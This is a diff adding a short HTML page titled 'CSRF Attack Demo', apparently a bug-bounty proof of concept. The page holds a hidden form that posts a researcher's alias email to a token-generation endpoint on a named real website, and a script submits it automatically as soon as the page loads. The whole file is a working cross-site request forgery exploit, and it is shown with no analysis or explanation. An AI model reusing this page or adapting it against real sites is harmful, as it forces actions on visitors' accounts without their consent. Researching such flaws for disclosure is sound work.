@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test</title>
+</head>
+<body>
+    <h1>CSRF Attack Demo</h1>
+    <form id="csrfForm" action="https://mybook.mylifeinabook.com/auth/genreatetoken" method="POST">
+        <input type="hidden" name="email" value="babakizo-ywh-8c0056f679032852@yeswehack.ninja">
+        <input type="submit" value="Submit">
+    </form>
+
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
